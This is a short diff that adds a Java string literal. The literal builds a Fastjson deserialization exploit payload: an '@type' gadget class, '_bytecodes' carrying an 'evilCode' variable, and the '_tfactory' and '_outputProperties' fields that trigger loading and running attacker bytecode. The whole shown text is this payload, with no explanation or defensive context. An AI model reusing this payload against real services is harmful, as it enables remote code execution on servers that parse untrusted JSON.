@@ -1,0 +1,11 @@
+"
+
+{
+    
+    \"@type\":\"" + NASTY_CLASS + "\",
+    \"_bytecodes\":[\""+evilCode+"\"],
+    '_name':'Drunkbaby',
+    '_tfactory':{ },
+    \"_outputProperties\":{ },
+
+";
